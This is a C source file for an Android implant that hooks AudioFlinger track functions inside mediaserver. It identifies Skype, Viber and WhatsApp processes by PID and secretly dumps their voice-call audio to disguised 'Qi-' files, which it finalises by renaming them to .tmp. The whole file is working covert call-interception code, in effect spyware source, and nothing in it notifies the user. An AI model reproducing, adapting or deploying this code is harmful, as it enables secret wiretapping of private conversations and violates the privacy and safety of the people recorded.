#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdlib.h>
#include "libt.h"
#include "util.h"
#include <errno.h>
#include "hooker.h"
#include "uthash.h"
#include <string.h>
#include <unistd.h>

/*
 * 20/08/2014
 * Testato con skype/viber su 4.1 OK
 * Testato con skype su 4.0 OK
 * 21/08/2014
 * Testato con skype su 4.2.2 failure
 *  Non viene recuperato il pid corretto e quindi la newTrack non crea la traccia di record
 */

#ifdef DEBUG
extern char tag[];
#endif

static int ip_register_offset = 0xd;
static int fd = 0;
static int fd_in = 0;
static int fd_out = 0;

struct cblk_t *cblkTracks = NULL;
struct cblk_t *cblkRecordTracks = NULL;
extern int android_version_ID;
extern unsigned int mname_offset;
extern unsigned int mname_this_offset;
extern unsigned int mStramType_this_offset;
extern unsigned int mState_offset;
extern unsigned int sample_rate_offset;
extern unsigned int mClient_thisP_offset;
extern unsigned int mPid_mClient_offset;
extern unsigned int mCblk_this_offset;
char *dumpPath =  ".................____________.......................";
char * printTrackstate(track_state t){
  switch (t){
    case IDLE:
      return "IDLE";
      break;
    case TERMINATED:      return "TERMINATED";
      break;
    case FLUSHED:
      return "FLUSHED";
      break;
    case STOPPED:
      return "STOPPED";
      break;
      // next 2 states are currently used for fast tracks only
    case STOPPING_1:     // waiting for first underrun
      return "STOPPING_1";
      break;
    case STOPPING_2:     // waiting for presentation complete
      return "STOPPING_2";
      break;
    case RESUMING:
      return "RESUMING:";
      break;
    case ACTIVE:
      return "ACTIVE";
      break;
    case PAUSING:
      return "PAUSING";
      break;
    case PAUSED:
      return "PAUSED";
      break;

    default:
      break;
  }
#ifdef DEBUG_HOOKFNC
  log("state=%d",t);
#endif
  return "UNKNOWN";
}
char local_started=0;
#define PRG_UNKNOWN_ID 0x0
#define PRG_SKYPE_ID 0x0146
#define PRG_VIBER_ID 0x0148
#define PRG_WHATSAPP_ID 0x014b
#define PRG_WECHAT_ID 0x0149
#define PRG_MEDIASERVER_ID 0x1

#define MAX_STRLEN 50
enum{
	POS_SKYPE=0,
	POS_VIBER,
	POS_WHATSAPP,
	POS_MEDIA,
	POS_RET,
	POS_MAX
};

const char *pid_name[]={
		"com.skype.raider",
		"com.viber.voip",
		"com.whatsapp"
		"/system/bin/mediaserver",
		"unknown"
};
int last_pid_lookup[POS_MAX];
int last_pid_lookup_res[POS_MAX];
int last_found=-1;
int get_command_id(int pid) {
	int i=0;
	int found = 0;
	if(pid<=0){
		return 0;
	}
	if(last_pid_lookup[POS_RET]==pid){
		found=1;
	}
	for(i=0;i<POS_RET&&found==0;i++)
	{
		if(last_pid_lookup[i]==pid){
			last_pid_lookup_res[POS_RET]=last_pid_lookup_res[i];
			last_found=i;
			found=1;
		}
	}
	if(found==0){
		FILE *f;
		char file[MAX_STRLEN], cmdline[MAX_STRLEN] = {0};
		sprintf(file, "/proc/%d/cmdline", pid);

		f = fopen(file, "r");
		if (f) {
			char *p = cmdline;
			fgets(cmdline, MAX_STRLEN-1, f);
			fclose(f);
			cmdline[MAX_STRLEN-1]='\0';
			while (*p) {
				p += strlen(p);
				if (*(p + 1)) {
					*p = ' ';
				}
				p++;
			}
			last_pid_lookup[POS_RET] = pid;
			if(strncmp(cmdline,pid_name[POS_SKYPE],16) == 0) {
				last_pid_lookup[POS_SKYPE] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
				last_found=POS_SKYPE;
			}else  if(strncmp(cmdline, pid_name[POS_VIBER],14) == 0) {
				last_pid_lookup[POS_VIBER] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
				last_found=POS_VIBER;
			}else  if(strncmp(cmdline, pid_name[POS_WHATSAPP],12) == 0) {
                           last_pid_lookup[POS_WHATSAPP] = pid;
                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WHATSAPP] = PRG_WHATSAPP_ID;
                           last_found=POS_WHATSAPP;
                        }else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
				last_pid_lookup[POS_MEDIA] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
				last_found=POS_MEDIA;
			}else{
				last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
				last_found=POS_RET;
			}

		} else {
#if defined DEBUG_HOOKFNC
			log("unable to open file %s\n", file);
#endif
			return 0;
		}

	}
#if defined DEBUG_HOOKFNC
	if(last_found<POS_MAX && last_found>=0){
	//	log("[%d]%d=%s\n",last_found,pid,pid_name[last_found]);
	}else{
	//	log("[%d]%d=%s\n",last_found,pid,"?unknown?");
	}
#endif
	return last_pid_lookup_res[POS_RET];
}

/* start signaling hooks */

#define USE_MNAME

void* recordTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w)  {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  
#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- enter recordTrackStart -------------\n");
#endif

  h_ptr = (void *) recordTrackStart_helper.orig;
  helper_precall(&recordTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  helper_postcall(&recordTrackStart_helper);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- exit recordTrackStart -------------\n");
#endif

  return result;

}


void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  char *filename;
  struct cblk_t *cblk_tmp;
  unsigned long cblk;
  unsigned int uintTmp;
  time_t now;

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- enter recordTrackStop -------------\n");
#endif 

  h_ptr = (void *) recordTrackStop_helper.orig;
  helper_precall(&recordTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrackStop_helper);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  cblk = *(unsigned long*) (a + mCblk_this_offset);

#ifdef DEBUG_HOOKFNC
//  log("\tstop track cblk_id: %x\n", cblk);
#endif


  h_ptr = (void *) recordTrackStop_helper.orig;
  helper_precall(&recordTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrackStop_helper);
  //  log("\t\t\t\tresult: %d\n", (int) result);

  HASH_FIND_INT( cblkRecordTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL  ) {

    // TODO: temporary fix
    if( cblk_tmp->stopDump == 1) {
#ifdef DEBUG_HOOKFNC
      log("\trecordTrackStop already called\n");
#endif
      return result;
    }
    cblk_tmp->stopDump = 1;

    /* write fake final header */
    now = time(NULL);
    write(cblk_tmp->fd, &now, 4); // 1] epoch start

    uintTmp = 0xf00df00d;
    write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType

    uintTmp = cblk_tmp->sampleRate;
    write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate

    uintTmp = 0;
    write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block

    /* rename file to .tmp and free the cblk structure  */
#ifdef DEBUG_HOOKFNC
    log("Stop: should take a dump: %s\n", (cblk_tmp->filename!=NULL)?cblk_tmp->filename:"none");
#endif

    if(cblk_tmp->filename!=NULL){
      /* rename file *.bin to *.tmp */
      filename = strdup(cblk_tmp->filename); // check return value
      *(filename+strlen(filename)-1) = 'p';
      *(filename+strlen(filename)-2) = 'm';
      *(filename+strlen(filename)-3) = 't';

      res = rename(cblk_tmp->filename, filename);

#ifdef DEBUG_HOOKFNC
      //    log("fname %s\n", filename);
      //    log("rename %d\n", res );
#endif


      // 12/10
      if( filename != NULL) {
        free(filename);
        filename = NULL;
      }
    }
    close(cblk_tmp->fd);
    cblk_tmp->fd = -1;
    /* free some stuff */
    if( cblk_tmp->trackId != NULL ) {
      free(cblk_tmp->trackId);
      cblk_tmp->trackId = NULL;
    }

    if( cblk_tmp->filename != NULL ) {
      free(cblk_tmp->filename);
      cblk_tmp->filename = NULL;
    }

    /* for playback tracks we keep the structure,
       for record we can free since the new track
       is created from within the dumper
     */
    HASH_DEL(cblkRecordTracks, cblk_tmp);
    free(cblk_tmp);
    local_started=0;


#ifdef DEBUG_HOOKFNC
//    log("freed all the stuff\n");
#endif
  }

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- exit recordTrackStop -------------\n");
#endif

  return result;
}



void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void *result;
  unsigned long cblk;
  unsigned int sampleRate;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  char pidC[11]; // pid %d 10 +null
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;
  int streamType = (int) d;
  int pid =0;

#ifdef DEBUG_HOOKFNC
// log("enter new track\n");
// log("\tpbthread: %x\n\tclient: %x\n\tstreamType: %x\n\tsampleRate: %d\n\tformat: %x\n\tchannelMask: %x\n\tframeCount: %x\n\tsharedBuffer: %x\n\tsessionId: %x\n\ttid: %x\n\tflags: %x\n", b, c,d, e, f, g, h, i, l, m, n);
#endif

  h_ptr = (void *) newTrack_helper.orig;
  helper_precall(&newTrack_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&newTrack_helper);



  cblk = *(unsigned long*) (a + mCblk_this_offset);

  /* rettifica il vero pid si trova in : questo per il >4.3 , ma se cosi fosse allora tutti i calcoli su b sono errati?? per il 4.3??
   * (gdb) p/x (int)&(('android::AudioFlinger::Client' *)0)->mPid ovver b->mPid
   * $7 = 0x10
   *
   */

  unsigned long mClient;
  mClient = *(unsigned long*) (a + mClient_thisP_offset);
  pid = *(int*) (mClient + mPid_mClient_offset );
#ifdef DEBUG_HOOKFNC
  log("\tnew track cblk: %p calling pid=%d\n ", cblk,pid);
#endif
  if(pid>0){
	  int tmp=0;
	  tmp=get_command_id(pid);
#ifdef DEBUG_HOOKFNC
	  if(tmp<=0 && streamType==0){
		  log("pid %d not found",pid);
	  }
#endif
	  pid=tmp;
  }else{
	  pid=0;
  }
  // ----------------------------------

    /* fetch the necessary fields */

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */
  if (android_version_ID >= ANDROID_V_4_3)
    frameSize = *(unsigned char *) (a + 0x40 );
  else
    frameSize = *(unsigned char *) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  if (android_version_ID >= ANDROID_V_4_3){
    sampleRate = (unsigned int) e;
  }else{
    sampleRate = *(unsigned int*) (cblk + 0x30);
  }

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %d\n", sampleRate);
#endif

  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  //log("start hash find\n");


  /* TODO evitare il tracking di tutta la traccia
   * quindi sia nella tabella di hash */
  if( pid>PRG_MEDIASERVER_ID  ) {
    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

    if( cblk_tmp != NULL ){
      //this is here because of the old call, FREE IT!!!
      if(cblk_tmp->fd != -1)
        close(cblk_tmp->fd);
      cblk_tmp->fd = -1;
      if( cblk_tmp->filename != NULL ) {
#ifdef DEBUG_HOOKFNC
          log("FREEING LEFTOVER: %s", cblk_tmp->filename);
#endif
        free(cblk_tmp->filename);
        cblk_tmp->filename = NULL;
      }else{
#ifdef DEBUG_HOOKFNC
          log("FREEING LEFTOVER: for %p", cblk);
#endif
      }
      if( cblk_tmp->trackId != NULL ) {
        free(cblk_tmp->trackId);
        cblk_tmp->trackId = NULL;
      }
      HASH_DEL(cblkTracks, cblk_tmp);
      free(cblk_tmp);
      cblk_tmp =NULL;

    }

    if( cblk_tmp == NULL ){
      cblk_tmp =  malloc( sizeof(struct cblk_t) );
      cblk_tmp->filename=NULL;
      cblk_tmp->cblk_index = cblk;
      cblk_tmp->streamType = streamType;
      cblk_tmp->lastStatus = STATUS_NEW;
      cblk_tmp->pid=pid;
      snprintf(randString, 11, "%lu", mrand48());
      snprintf(timestamp,  11, "%d", time(NULL));
      snprintf(pidC,  11, "%d", pid);
      cblk_tmp->trackId = strdup(randString);

#ifdef DEBUG_HOOKFNC
      //    log("trackId: %s\n", cblk_tmp->trackId);
#endif

      // Qi-<timestamp>-<id univoco per chiamata>-<canale>.[tmp|boh]
      // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
      // filenameLength including null

      if( cblk_tmp->streamType == 0 ) {
        if(local_started || (pid!=PRG_SKYPE_ID&&pid>PRG_MEDIASERVER_ID)){
          filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3+1+strlen(pidC);

          cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
          snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, randString,pidC );


#ifdef DEBUG_HOOKFNC
          if(cblk_tmp->pid==PRG_MEDIASERVER_ID)
            log("trackId: %s owned by mediaserver ", cblk_tmp->trackId);
#endif

          cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
          log("filename: %s open %s sampleRate %d", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED",sampleRate);
#endif
        }else{
#ifdef DEBUG_HOOKFNC
          log("create file when local has sarted");
#endif
        }
      }

      cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);

      cblk_tmp->lastBufferRaw  = bufferRaw;
      cblk_tmp->lastFrameCount = framesCount;
      cblk_tmp->lastFrameSize  = frameSize;


      cblk_tmp->sampleRate = sampleRate;

      HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp); // new track
      cblk_tmp = NULL;

      HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

      if( cblk_tmp == NULL ) {
#ifdef DEBUG_HOOKFNC
        log("uthash issue\n");
#endif
        return result;
      }
#ifdef DEBUG_HOOKFNC
      //log("\tnew Track added cblk\n");
#endif

    }else{
#ifdef DEBUG_HOOKFNC
          log("WTF something very wrong bob!!! cblk_tmp should be NULL!!!");
#endif
    }
  }
#ifdef DEBUG_HOOKFNC
//  log("\t\t\t----------- exit new track %p %p ------------------\n", result, a)
#endif

  return result;
}


void* playbackTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned long cblk;

  struct cblk_t *cblk_tmp= NULL;

  char randString[11]; // rand %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  int filenameLength = 0;
  char *filename;


#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- enter playbackTrackStart -------------\n");
//  log("enter start track %x\n", a);
//  log("\tevent: %x\n\ttriggerSession: %x\n\n", b, c);
#endif

  cblk = *(unsigned long*) (a + mCblk_this_offset);



  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL ) {
#ifdef DEBUG_HOOKFNC
    log("\tcblk found %x last known status %s\n", cblk, (cblk_tmp->lastStatus==STATUS_STOP)?"STOP":"START");
#endif

    /* if status is STATUS_STOP, create the fields freed by stop event */
    if( cblk_tmp->lastStatus == STATUS_STOP && local_started) {
#ifdef USE_OLD_NAME
      /* use old trackId and filename */
      *(cblk_tmp->filename+strlen(cblk_tmp->filename)-1) = 'n';
      *(cblk_tmp->filename+strlen(cblk_tmp->filename)-2) = 'i';
      *(cblk_tmp->filename+strlen(cblk_tmp->filename)-3) = 'b';
      cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
      log("reusing filename: %s open:%s\n", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
#endif
#else //ifdef USE_OLD_NAME
      /* DON'T reuse old filename, just keep the track id */
      unsigned long mClient;
      char pidC[11]; // pid %d 10 +null
      mClient = *(unsigned long*) (a + mClient_thisP_offset);
      int pid = *(int*) (mClient + mPid_mClient_offset );

#ifdef DEBUG_HOOKFNC
      log("\tnew playbackTrackStart_h cblk: %p calling pid=%d\n ", cblk,pid);
#endif
      if(pid>0){
        int tmp=0;
        tmp=get_command_id(pid);
#ifdef DEBUG_HOOKFNC
        if(tmp<=0 ){
          log("pid %d not found",pid);
        }
#endif
        pid=tmp;
      }else{
        pid=0;
      }
      if(   pid>PRG_MEDIASERVER_ID ) {
        snprintf(timestamp,  11, "%d", time(NULL));
        snprintf(pidC,  11, "%d", cblk_tmp->pid);
        filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 +1 + strlen(pidC);

        cblk_tmp->filename = realloc(cblk_tmp->filename, sizeof(char) *  filenameLength  );
        snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );

        cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
        log("new filename created same trackID: %s open:%s\n", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
#endif
      }
#endif //ifdef USE_OLD_NAME

    }
  }
  else {
#ifdef DEBUG_HOOKFNC
    //log("\tcblk not found %x\n", cblk);
#endif

  }

  h_ptr = (void *) playbackTrackStart_helper.orig;
  helper_precall(&playbackTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStart_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
//  log("\t\t\t------- exit playbackTrackStart -------------\n");
#endif

  return result;
}

void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned int cblk;
  char *filename;
  struct cblk_t *cblk_tmp = NULL;
  unsigned int uintTmp;
  time_t now;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- enter playbackTrackStop -------------\n");
#endif

  cblk = *(unsigned long*) (a + mCblk_this_offset);

#ifdef DEBUG_HOOKFNC
  log("\ttrack cblk: %x\n", cblk);
#endif

  h_ptr = (void *) playbackTrackStop_helper.orig;
  helper_precall(&playbackTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStop_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL && cblk_tmp->streamType == 0  && cblk_tmp->filename!=NULL) {

    /* write fake final header */
    now = time(NULL);
    write(cblk_tmp->fd, &now, 4); // 1] epoch start

    uintTmp = 0xf00df00d;
    write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType

    uintTmp = cblk_tmp->sampleRate;
    write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate

    uintTmp = 0;
    write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block


    /* rename file to .tmp and free the cblk structure  */



    /* rename file *.bin to *.tmp */
    filename = strdup(cblk_tmp->filename); // check return value
    *(filename+strlen(filename)-1) = 'p';
    *(filename+strlen(filename)-2) = 'm';
    *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
    log("fname %s FINALIZED\n", filename);
    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif

    rename(cblk_tmp->filename, filename);

    if( filename != NULL)
      free(filename);


    close(cblk_tmp->fd);
    cblk_tmp->fd = -1;
    /* free some stuff */
    //if( cblk_tmp->trackId != NULL ) {
    //  free(cblk_tmp->trackId);
    //  cblk_tmp->trackId = NULL;
    //}

    //if( cblk_tmp->filename != NULL ) {
    //  free(cblk_tmp->filename);
    //  cblk_tmp->filename = NULL;
    //}

    /* 14/04/14
       patch for weird skype events
       1] newTrack
       2] start track
       3] stop track
       4] start track again

    */

    cblk_tmp->lastStatus = STATUS_STOP;
    //HASH_DEL(cblkTracks, cblk_tmp);
    //free(cblk_tmp);

#ifdef DEBUG_HOOKFNC
  //  log("freed all the stuff %x\n", cblk);
#endif
  }else{
#ifdef DEBUG_HOOKFNC
	  log("track %x not found \n", cblk);
#endif
  }

#ifdef DEBUG_HOOKFNC
  //log("\t\t\t------- exit playbackTrackStop -------------\n");
#endif

  return result;
}



void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned long cblk;
  struct cblk_t *cblk_tmp= NULL;
  char *filename;
  unsigned int uintTmp;
  time_t now;
#ifdef DEBUG_HOOKFNC
 // log("\t\t\t------- enter playbackTrackPause -------------\n");
#endif

  cblk = *(unsigned long*) (a + mCblk_this_offset);

#ifdef DEBUG_HOOKFNC
  log("\tcblk: %x\n", cblk);
#endif

  h_ptr = (void *) playbackTrackStart_helper.orig;
  helper_precall(&playbackTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStart_helper);
  /* questo if viene fatto nel caso in cui la traccia venga messa in pausa per tutta la chiamata
  ,per evitare che nella chiamata successiva venga riaperta e chiusa , la chiudiamo immediatamente
  if(android_version_ID < ANDROID_V_4_3){
    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

    if( cblk_tmp != NULL && cblk_tmp->pid==PRG_MEDIASERVER_ID && cblk_tmp->streamType == 0) {

      // write fake final header 
       now = time(NULL);
       write(cblk_tmp->fd, &now, 4); // 1] epoch start

       uintTmp = 0xf00df00d;
       write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType

       uintTmp = cblk_tmp->sampleRate;
       write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate

       uintTmp = 0;
       write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block


       // rename file to .tmp and free the cblk structure


       // rename file *.bin to *.tmp
       filename = strdup(cblk_tmp->filename); // check return value
       *(filename+strlen(filename)-1) = 'p';
       *(filename+strlen(filename)-2) = 'm';
       *(filename+strlen(filename)-3) = 't';

   #ifdef DEBUG_HOOKFNC
       log("fname %s FINALIZED\n", filename);
       //log("rename %d\n", rename(cblk_tmp->filename, filename) );
   #endif

       rename(cblk_tmp->filename, filename);

       if( filename != NULL)
         free(filename);


       close(cblk_tmp->fd);



       if( cblk_tmp->filename != NULL ) {
         free(cblk_tmp->filename);
         cblk_tmp->filename = NULL;
       }
       cblk_tmp->lastStatus = STATUS_STOP;
       HASH_DEL(cblkTracks, cblk_tmp);
       free(cblk_tmp);

    }
  }
  */
#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
//  log("\t\t\t------- exit playbackTrackPause -------------\n");
#endif

  return result;
}




//TODO: provare a hoockare al seguente000343a5 g     F .text  00000100 android::AudioFlinger::PlaybackThread::threadLoop_write() per 4.3
// 000343a5 g     F .text 00000100 _ZN7android12AudioFlinger14PlaybackThread16threadLoop_writeEv
/*
void AudioFlinger::PlaybackThread::threadLoop_write()
1647{
1648    // FIXME rewrite to reduce number of system calls
1649    mLastWriteTime = systemTime();
1650    mInWrite = true;
1651    int bytesWritten;
1652
1653    // If an NBAIO sink is present, use it to write the normal mixer's submix
1654    if (mNormalSink != 0) {
1655#define mBitShift 2 // FIXME
1656        size_t count = mixBufferSize >> mBitShift;
1657        ATRACE_BEGIN("write");
1658        // update the setpoint when AudioFlinger::mScreenState changes
1659        uint32_t screenState = AudioFlinger::mScreenState;
1660        if (screenState != mScreenState) {
1661            mScreenState = screenState;
1662            MonoPipe *pipe = (MonoPipe *)mPipeSink.get();
1663            if (pipe != NULL) {
1664                pipe->setAvgFrames((mScreenState & 1) ?
1665                        (pipe->maxFrames() * 7) / 8 : mNormalFrameCount * 2);
1666            }
1667        }
1668        ssize_t framesWritten = mNormalSink->write(mMixBuffer, count);
1669        ATRACE_END();
1670        if (framesWritten > 0) {
1671            bytesWritten = framesWritten << mBitShift;
1672        } else {
1673            bytesWritten = framesWritten;
1674        }
1675    // otherwise use the HAL / AudioStreamOut directly
1676    } else {
1677        // Direct output thread.
1678        bytesWritten = (int)mOutput->stream->write(mOutput->stream, mMixBuffer, mixBufferSize);
1679    }
1680
1681    if (bytesWritten > 0) {
1682        mBytesWritten += mixBufferSize;
1683    }
1684    mNumWrites++;
1685    mInWrite = false;
1686}

 offsets-of 'android::AudioFlinger::MixerThread'
     android::AudioFlinger::PlaybackThread => 0
     android::Thread => 0
    mLock => 36
    mType => 40
    mWaitWorkCV => 44
    mAudioFlinger => 48
    mSampleRate => 52
    mFrameCount => 56 == 0x38
    mNormalFrameCount => 60
    mChannelMask => 64
    mChannelCount => 68
    mFrameSize => 72 == 0x48
    mFormat => 76
    mParamCond => 80
    mNewParameters => 84
    mParamStatus => 104
    mConfigEvents => 108
    mStandby => 128
    mOutDevice => 132
    mInDevice => 136
    mAudioSource => 140
    mId => 144
    mEffectChains => 148

    mMixBuffer => 220 == 0xdc
    mSuspended => 224
    mBytesWritten => 228
    mMasterMute => 232
    mActiveTracks => 236 == 0xef
    mTracks => 256
    mStreamTypes => 276
    mOutput => 364
    mMasterVolume => 368
    mLastWriteTime => 376
    mNumWrites => 384
    mNumDelayedWrites => 388
    mInWrite => 392
    standbyTime => 400
    mixBufferSize => 408
    activeSleepTime => 412
    idleSleepTime => 416
    sleepTime => 420
    mMixerStatus => 424
    mMixerStatusIgnoringFastTracks => 428
    sleepTimeShift => 432
    standbyDelay => 440
    maxPeriod => 448
    writeFrames => 456
    mOutputSink => 460
    mPipeSink => 464
    mNormalSink => 468 == 0x1d4
    mScreenState => 472

    mAudioMixer => 484
    mFastMixer => 488
    mAudioWatchdog => 492
    mFastMixerDumpState => 496
    mStateQueueObserverDump => 262760
    mStateQueueMutatorDump => 262764
    mAudioWatchdogDump => 262776
    mFastMixerFutex => 262788

    b 'android::AudioFlinger::PlaybackThread::threadLoop_write'
    p *this->mNormalSink.m_ptr
    p *this->mAudioMixer
    p *this->mAudioMixer->bufferProvider

*/
